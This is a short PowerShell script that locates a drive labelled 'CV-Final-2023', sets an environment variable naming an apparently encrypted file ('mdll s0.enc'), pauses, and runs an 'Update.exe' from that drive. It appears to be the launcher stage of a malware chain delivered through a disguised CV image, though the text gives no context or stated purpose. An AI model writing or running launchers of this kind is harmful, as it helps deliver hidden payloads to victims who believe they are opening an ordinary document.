$Env:hagrid="mdll s0.enc";
$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-Final-2023" | foreach { $_.DeviceID });
cd $device;
sleep 10;
.\Update.exe
